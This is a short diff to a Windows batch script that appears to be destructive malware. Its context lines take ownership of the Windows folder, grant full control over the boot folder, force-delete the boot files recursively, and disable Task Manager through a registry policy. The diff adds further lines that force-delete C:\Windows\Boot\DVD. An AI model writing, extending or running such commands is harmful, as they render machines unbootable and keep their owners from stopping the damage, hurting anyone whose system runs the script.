@@ -10,6 +10,8 @@ takeown /f "C:\Windows" /a
 icacls "C:\Windows\Boot" /grant administrators:F /t
 del /F /S /Q "C:\Windows\Boot"
 
+del /F /S /Q "C:\Windows\Boot\DVD"
+
 
 :B 
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
@@ -17,7 +19,7 @@ takeown /f "C:\Windows" /a
 icacls "C:\Windows\Boot" /grant administrators:F /t
 del /F /S /Q "C:\Windows\Boot" 
 
-
+del /F /S /Q "C:\Windows\Boot\DVD"
 
 
 
